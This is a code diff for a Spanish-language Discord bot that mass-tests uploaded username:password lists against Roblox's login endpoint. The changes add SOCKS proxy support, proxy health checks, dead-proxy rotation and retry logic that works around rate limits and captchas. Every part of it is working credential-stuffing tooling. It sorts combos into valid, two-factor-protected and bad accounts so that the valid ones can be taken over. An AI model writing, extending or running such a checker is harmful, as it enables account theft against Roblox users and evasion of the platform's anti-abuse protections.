@@ -2,11 +2,12 @@
 """
 Roblox Checker Bot
 Comando: /rbx-checker  (file)
-Variables: DISCORD_TOKEN, CONCURRENCY (opcional), TIMEOUT (opcional)
+Variables: DISCORD_TOKEN, CONCURRENCY, TIMEOUT, PROXY_SCHEME (todas opcionales salvo el token)
 """
 
 import asyncio
 import io
+import json
 import os
 import random
 import re
@@ -14,21 +15,29 @@ import time
 from collections import deque
 from datetime import datetime, timezone
 from email.utils import parsedate_to_datetime
+from urllib.parse import urlsplit
 
 import aiohttp
 import discord
 from discord import app_commands
 from discord.ext import commands
 
+try:
+    from aiohttp_socks import ProxyConnector
+except ImportError:
+    ProxyConnector = None
+
 TOKEN = os.getenv("DISCORD_TOKEN", "").strip()
-CONCURRENCY = max(1, int(os.getenv("CONCURRENCY", "20")))
+CONCURRENCY = max(1, int(os.getenv("CONCURRENCY", "15")))
 TIMEOUT = float(os.getenv("TIMEOUT", "20"))
+PROXY_SCHEME = os.getenv("PROXY_SCHEME", "http").strip().lower()
 MAX_COMBOS = 50_000
 MAX_FILE = 8 * 1024 * 1024
 MAX_RETRY_AFTER = 30.0
-PROXY_PENALTY = 8.0
+PROXY_PENALTY = 20.0
 STALL_WARN = 60
 EDIT_EVERY = 1.5
+HEALTH_EVERY = 300
 
 LOG_MAX = 5000
 LOG_BLOCK = 950
@@ -69,13 +78,15 @@ def _parse_proxies(raw: str) -> list[str]:
         parts = line.split(":")
         if len(parts) == 4:
             host, port, user, pw = parts
-            out.append(f"http://{user}:{pw}@{host}:{port}")
+            out.append(f"{PROXY_SCHEME}://{user}:{pw}@{host}:{port}")
         elif len(parts) == 2:
-            out.append(f"http://{parts[0]}:{parts[1]}")
+            out.append(f"{PROXY_SCHEME}://{parts[0]}:{parts[1]}")
     return out
 
 
-PROXIES = _parse_proxies(RAW_PROXIES)
+TODOS = _parse_proxies(RAW_PROXIES)
+PROXIES: list[str] = list(TODOS)
+MUERTOS: list[str] = []
 PROXY_COOLDOWN: dict[str, float] = {}
 GLOBAL_COOLDOWN = 0.0
 _proxy_i = 0
@@ -99,19 +110,21 @@ def penalizar(proxy: str | None, segundos: float):
         PROXY_COOLDOWN[proxy] = max(PROXY_COOLDOWN.get(proxy, 0), time.monotonic() + segundos)
 
 
-async def wait_cooldown(proxy: str | None):
+async def wait_cooldown(proxy: str | None, job=None) -> bool:
     while True:
+        if job and job.stopped:
+            return False
         ahora = time.monotonic()
         hasta = max(GLOBAL_COOLDOWN, PROXY_COOLDOWN.get(proxy, 0) if proxy else 0)
         left = hasta - ahora
         if left <= 0:
-            return
-        await asyncio.sleep(min(left, 1.5))
+            return True
+        await asyncio.sleep(min(left, 0.5))
 
 
-def retry_delay(r: aiohttp.ClientResponse) -> float:
+def retry_delay(r_headers) -> float:
     for header in ("retry-after", "x-ratelimit-reset", "x-ratelimit-reset-seconds"):
-        raw = r.headers.get(header)
+        raw = r_headers.get(header)
         if not raw:
             continue
         try:
@@ -126,6 +139,66 @@ def retry_delay(r: aiohttp.ClientResponse) -> float:
             except Exception:
                 continue
     return 4.0
+
+
+# ------------------------------------------------------------------ salud proxies
+async def _probar_proxy(url: str) -> bool:
+    partes = urlsplit(url)
+    host, port = partes.hostname, partes.port
+    if not host or not port:
+        return False
+    try:
+        _, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=7)
+        writer.close()
+        try:
+            await writer.wait_closed()
+        except Exception:
+            pass
+        return True
+    except Exception:
+        return False
+
+
+async def health_check(silencioso: bool = False) -> tuple[int, int]:
+    global PROXIES
+    if not TODOS:
+        return 0, 0
+
+    objetivo = MUERTOS if silencioso else TODOS
+    if not objetivo:
+        return len(PROXIES), len(MUERTOS)
+
+    res = await asyncio.gather(*(_probar_proxy(p) for p in objetivo))
+    vivos = [p for p, ok in zip(objetivo, res) if ok]
+    caidos = [p for p, ok in zip(objetivo, res) if not ok]
+
+    if silencioso:
+        for p in vivos:
+            MUERTOS.remove(p)
+            PROXY_COOLDOWN.pop(p, None)
+        PROXIES = [p for p in TODOS if p not in MUERTOS]
+    else:
+        MUERTOS[:] = caidos
+        PROXIES = vivos
+
+    if not silencioso:
+        print(f"Health check: {len(vivos)}/{len(TODOS)} proxies responden")
+        for p in caidos:
+            print(f"  muerto: {urlsplit(p).hostname}:{urlsplit(p).port}")
+
+    return len(PROXIES), len(MUERTOS)
+
+
+async def health_loop():
+    while True:
+        await asyncio.sleep(HEALTH_EVERY)
+        try:
+            if MUERTOS:
+                rec, _ = await health_check(silencioso=True)
+                if rec:
+                    print(f"Proxies recuperados, total vivos: {rec}")
+        except Exception as e:
+            print(f"health_loop: {e}")
 
 
 # ------------------------------------------------------------------ combos
@@ -226,113 +299,125 @@ class Worker:
             await self.session.close()
 
 
-async def check_one(w: Worker, user: str, pw: str) -> dict:
+async def _login(w: Worker, proxy: str | None, payload: dict):
+    """Devuelve (status, headers, body). Usa SOCKS si el esquema lo indica."""
+    if proxy and proxy.startswith("socks") and ProxyConnector is not None:
+        connector = ProxyConnector.from_url(proxy, rdns=True)
+        async with aiohttp.ClientSession(
+            headers=BASE_HEADERS,
+            connector=connector,
+            timeout=aiohttp.ClientTimeout(total=TIMEOUT, connect=8),
+        ) as s:
+            async with s.post(LOGIN_URL, json={}) as r:
+                csrf = r.headers.get("x-csrf-token")
+            h = {"x-csrf-token": csrf} if csrf else {}
+            async with s.post(LOGIN_URL, json=payload, headers=h) as r:
+                return r.status, r.headers, await r.text()
+
+    csrf = w.csrf.get(proxy or "")
+    if not csrf:
+        async with w.session.post(LOGIN_URL, json={}, proxy=proxy) as r:
+            csrf = r.headers.get("x-csrf-token")
+            if csrf:
+                w.csrf[proxy or ""] = csrf
+    h = {"x-csrf-token": csrf} if csrf else {}
+    async with w.session.post(LOGIN_URL, json=payload, headers=h, proxy=proxy) as r:
+        return r.status, r.headers, await r.text()
+
+
+async def check_one(w: Worker, user: str, pw: str, job=None):
+    """Devuelve dict de resultado, o None si se detuvo el job."""
     ctype = "Email" if "@" in user else "Username"
     payload = {"ctype": ctype, "cvalue": user, "password": pw}
 
-    intentos = 0
-    esperas_rl = 0
+    cadena: list[str | None] = []
+    if PROXIES:
+        cadena.append(next_proxy())
+        cadena.append(next_proxy())
+    cadena.append(None)
 
-    while intentos < 3:
-        proxy = next_proxy()
-        await wait_cooldown(proxy)
+    for proxy in cadena:
+        intentos = 0
+        esperas = 0
+        while intentos < 2:
+            if job and job.stopped:
+                return None
+            if not await wait_cooldown(proxy, job):
+                return None
 
-        try:
-            csrf = w.csrf.get(proxy or "")
-            if not csrf:
-                async with w.session.post(LOGIN_URL, json={}, proxy=proxy) as r:
-                    csrf = r.headers.get("x-csrf-token")
-                    if csrf:
-                        w.csrf[proxy or ""] = csrf
-
-            headers = {"x-csrf-token": csrf} if csrf else {}
-
-            async with w.session.post(
-                LOGIN_URL, json=payload, headers=headers, proxy=proxy
-            ) as r:
-                status = r.status
-
-                if status == 200:
-                    try:
-                        data = await r.json(content_type=None)
-                    except Exception:
-                        data = {}
-                    u = (data or {}).get("user") or {}
-                    return {
-                        "status": "valid",
-                        "username": u.get("name") or user,
-                        "display": u.get("displayName") or "",
-                    }
-
-                if status == 403:
-                    nuevo = r.headers.get("x-csrf-token")
-                    if nuevo:
-                        w.csrf[proxy or ""] = nuevo
-
-                    ctype_h = (r.headers.get("rblx-challenge-type") or "").lower()
-                    challenge = r.headers.get("rblx-challenge-id")
-                    body = (await r.text()).lower()
-
-                    if "twostep" in ctype_h or "twostep" in body or "two-step" in body:
-                        return {"status": "2fa"}
-
-                    if challenge or "captcha" in body or "challenge" in body:
-                        return {"status": "bad", "note": "captcha", "log": "captcha"}
-
-                    if intentos < 2:
-                        intentos += 1
-                        w.csrf.pop(proxy or "", None)
-                        continue
-                    return {"status": "bad", "note": "challenge", "log": "challenge"}
-
-                if status in (400, 401):
-                    return {"status": "bad"}
-
-                if status == 429:
-                    esperas_rl += 1
-                    delay = retry_delay(r)
-                    penalizar(proxy, delay)
-                    if delay >= 15:
-                        globals()["GLOBAL_COOLDOWN"] = max(
-                            GLOBAL_COOLDOWN, time.monotonic() + min(delay, MAX_RETRY_AFTER)
-                        )
-                    if esperas_rl > 4:
-                        return {
-                            "status": "error",
-                            "note": "rate limit",
-                            "log": f"429 x{esperas_rl} en {proxy or 'directo'}",
-                        }
+            try:
+                status, headers, body = await _login(w, proxy, payload)
+            except asyncio.TimeoutError:
+                penalizar(proxy, PROXY_PENALTY)
+                if proxy:
+                    break
+                if intentos < 1:
+                    intentos += 1
                     continue
+                return {"status": "error", "note": "timeout", "tipo": "timeout"}
+            except aiohttp.ClientError as e:
+                penalizar(proxy, PROXY_PENALTY)
+                if proxy:
+                    break
+                if intentos < 1:
+                    intentos += 1
+                    continue
+                return {"status": "error", "note": type(e).__name__, "tipo": "proxy"}
+            except Exception as e:
+                return {"status": "error", "note": str(e)[:60], "tipo": "error"}
 
-                if status >= 500:
-                    if intentos < 2:
-                        intentos += 1
-                        penalizar(proxy, 3)
-                        continue
-                    return {"status": "error", "note": f"HTTP {status}", "log": f"HTTP {status}"}
+            if status == 200:
+                try:
+                    data = json.loads(body)
+                except Exception:
+                    data = {}
+                u = (data or {}).get("user") or {}
+                return {"status": "valid", "username": u.get("name") or user}
 
-                return {"status": "error", "note": f"HTTP {status}", "log": f"HTTP {status}"}
+            if status == 403:
+                nuevo = headers.get("x-csrf-token")
+                if nuevo:
+                    w.csrf[proxy or ""] = nuevo
+                ctype_h = (headers.get("rblx-challenge-type") or "").lower()
+                challenge = headers.get("rblx-challenge-id")
+                low = body.lower()
 
-        except asyncio.TimeoutError:
-            penalizar(proxy, PROXY_PENALTY)
-            if intentos < 2:
-                intentos += 1
+                if "twostep" in ctype_h or "twostep" in low or "two-step" in low:
+                    return {"status": "2fa"}
+                if challenge or "captcha" in low or "challenge" in low:
+                    return {"status": "bad", "note": "captcha", "tipo": "captcha"}
+
+                if intentos < 1:
+                    intentos += 1
+                    w.csrf.pop(proxy or "", None)
+                    continue
+                return {"status": "bad", "note": "challenge", "tipo": "captcha"}
+
+            if status in (400, 401):
+                return {"status": "bad"}
+
+            if status == 429:
+                esperas += 1
+                delay = retry_delay(headers)
+                penalizar(proxy, delay)
+                if delay >= 15:
+                    globals()["GLOBAL_COOLDOWN"] = max(
+                        GLOBAL_COOLDOWN, time.monotonic() + delay
+                    )
+                if esperas > 4:
+                    return {"status": "error", "note": "rate limit", "tipo": "429"}
                 continue
-            return {"status": "error", "note": "timeout", "log": f"timeout {proxy or 'directo'}"}
-        except aiohttp.ClientError as e:
-            penalizar(proxy, PROXY_PENALTY)
-            if intentos < 2:
-                intentos += 1
-                continue
-            return {
-                "status": "error",
-                "note": type(e).__name__,
-                "log": f"{type(e).__name__} {proxy or 'directo'}",
-            }
-        except Exception as e:
-            return {"status": "error", "note": str(e)[:60], "log": repr(e)[:120]}
 
-    return {"status": "error", "note": "sin respuesta", "log": "sin respuesta"}
+            if status >= 500:
+                penalizar(proxy, 5)
+                if intentos < 1:
+                    intentos += 1
+                    continue
+                return {"status": "error", "note": f"HTTP {status}", "tipo": "http"}
+
+            return {"status": "error", "note": f"HTTP {status}", "tipo": "http"}
+
+    return {"status": "error", "note": "todos los proxies fallaron", "tipo": "proxy"}
 
 
 # ------------------------------------------------------------------ job
@@ -356,11 +441,11 @@ class Job:
         self.paused.set()
         self.stopped = False
         self.finished = False
+        self.gen = 0
         self.message: discord.Message | None = None
         self.err_message: discord.Message | None = None
         self.view: "JobView | None" = None
-        self.workers: list[asyncio.Task] = []
-        self.sesiones: list[Worker] = []
+        self.run_task: asyncio.Task | None = None
         self._editor: asyncio.Task | None = None
         self._watchdog: asyncio.Task | None = None
 
@@ -373,8 +458,6 @@ class Job:
         clave = tipo.lower()
         if clave in self.contadores:
             self.contadores[clave] += 1
-        elif tipo in ("429", "FATAL"):
-            self.contadores["429" if tipo == "429" else "fatal"] += 1
 
     async def _record(self, user: str, pw: str, res: dict):
         combo = f"{user}:{pw}"
@@ -387,15 +470,14 @@ class Job:
             self.bad.append(combo)
         else:
             self.errors.append(f"{combo}  # {res.get('note', 'error')}")
-        if res.get("log"):
-            tipo = "429" if "429" in res["log"] else res["status"].upper()
-            self.log(tipo, f"{user} · {res['log']}")
+        tipo = res.get("tipo")
+        if tipo:
+            nombre = "directo" if not PROXIES else ""
+            self.log(tipo.upper(), f"{user} · {res.get('note') or tipo}")
         self.checked += 1
         self.ultimo_avance = time.monotonic()
 
-    async def _worker(self):
-        w = Worker()
-        self.sesiones.append(w)
+    async def _worker(self, w: Worker):
         try:
             while True:
                 await self.paused.wait()
@@ -408,29 +490,33 @@ class Job:
                 self.current = f"{user}:{pw}"
                 self.inflight += 1
                 try:
-                    res = await check_one(w, user, pw)
+                    res = await check_one(w, user, pw, self)
                 finally:
                     self.inflight -= 1
+                if res is None:
+                    self.pending.appendleft((user, pw))
+                    return
                 await self._record(user, pw, res)
         finally:
             await w.close()
 
     async def run(self):
+        self.gen += 1
+        gen = self.gen
         n = min(CONCURRENCY, max(self.total, 1))
+        workers = [Worker() for _ in range(n)]
         try:
-            await asyncio.gather(*(self._worker() for _ in range(n)))
+            await asyncio.gather(*(self._worker(w) for w in workers))
         except Exception as e:
             self.log("FATAL", repr(e)[:150])
             self.stopped = True
         finally:
-            for w in self.sesiones:
+            for w in workers:
                 try:
                     await w.close()
                 except Exception:
                     pass
-            if not self.stopped and not self.pending:
-                self.finished = True
-            elif not self.pending:
+            if gen == self.gen and not self.pending:
                 self.finished = True
             await self.refresh()
 
@@ -445,8 +531,8 @@ class Job:
                 bloqueados = sum(1 for t in PROXY_COOLDOWN.values() if t > ahora)
                 self.log(
                     "WARN",
-                    f"sin avance {int(quieto)}s · {bloqueados}/{len(PROXIES)} proxies en espera "
-                    f"· global {max(GLOBAL_COOLDOWN - ahora, 0):.0f}s",
+                    f"sin avance {int(quieto)}s · {bloqueados} proxies en espera "
+                    f"· vivos {len(PROXIES)}/{len(TODOS)}",
                 )
                 await self.refresh()
 
@@ -472,7 +558,9 @@ class Job:
             estado = "Detenido"
         else:
             estado = "Checkeando"
-        e.set_footer(text=f"{estado} · {self.inflight} en vuelo · {CONCURRENCY} hilos · {len(PROXIES)} proxies")
+        e.set_footer(
+            text=f"{estado} · {self.inflight} en vuelo · {len(PROXIES)}/{len(TODOS)} proxies vivos"
+        )
         return e
 
     def errors_embed(self) -> discord.Embed:
@@ -489,7 +577,10 @@ class Job:
         libres = sum(1 for p in PROXIES if PROXY_COOLDOWN.get(p, 0) <= ahora)
         e.add_field(
             name="Proxies",
-            value=f"`{libres}/{len(PROXIES)}` libres · global `{max(GLOBAL_COOLDOWN - ahora, 0):.0f}s`",
+            value=(
+                f"`{libres}/{len(PROXIES)}` libres · `{len(MUERTOS)}` muertos "
+                f"· global `{max(GLOBAL_COOLDOWN - ahora, 0):.0f}s`"
+            ),
             inline=False,
         )
 
@@ -588,13 +679,14 @@ class JobView(discord.ui.View):
         if not self.job.stopped:
             await it.response.send_message("Ya está corriendo.", ephemeral=True)
             return
+        if not self.job.pending:
+            await it.response.send_message("No quedan combos pendientes.", ephemeral=True)
+            return
         self.job.stopped = False
         self.job.paused.set()
         self.job.ultimo_avance = time.monotonic()
         self.job.log("WARN", "reanudado por el usuario")
-        vivos = [t for t in self.job.workers if not t.done()]
-        if not vivos and self.job.pending:
-            self.job.workers = [asyncio.create_task(self.job.run())]
+        self.job.run_task = asyncio.create_task(self.job.run())
         await it.response.send_message("Reanudado.", ephemeral=True)
         await self.job.refresh()
 
@@ -617,6 +709,7 @@ class ErrorsView(discord.ui.View):
             f"Checkeados: {self.job.done}",
             f"429: {self.job.contadores['429']} | captchas: {self.job.contadores['captcha']} "
             f"| timeouts: {self.job.contadores['timeout']} | proxies: {self.job.contadores['proxy']}",
+            f"Proxies vivos: {len(PROXIES)}/{len(TODOS)} | muertos: {len(MUERTOS)}",
             "-" * 40,
         ]
         await it.response.send_message(
@@ -641,15 +734,23 @@ async def sync_guild(guild: discord.Guild):
 
 @bot.event
 async def on_ready():
+    vivos, muertos = await health_check()
+    print(f"Proxies vivos: {vivos} | muertos: {muertos}")
+    if not vivos:
+        print("Sin proxies utilizables: el bot irá directo y esperará más captchas")
+
     try:
         synced = await bot.tree.sync()
         print(f"Comandos globales sincronizados: {len(synced)}")
     except discord.HTTPException as e:
         print(f"Error en sync global: {e}")
+
     for guild in bot.guilds:
         await sync_guild(guild)
         await asyncio.sleep(1)
-    print(f"Listo: {bot.user} | {len(bot.guilds)} servidores | {len(PROXIES)} proxies | {CONCURRENCY} hilos")
+
+    asyncio.create_task(health_loop())
+    print(f"Listo: {bot.user} | {len(bot.guilds)} servidores")
 
 
 @bot.event
@@ -702,7 +803,7 @@ async def rbx_checker(interaction: discord.Interaction, file: discord.Attachment
         embed=job.errors_embed(), view=ErrorsView(job), wait=True
     )
 
-    job.workers = [asyncio.create_task(job.run())]
+    job.run_task = asyncio.create_task(job.run())
     job._editor = asyncio.create_task(job.editor_loop())
     job._watchdog = asyncio.create_task(job.watchdog())
 
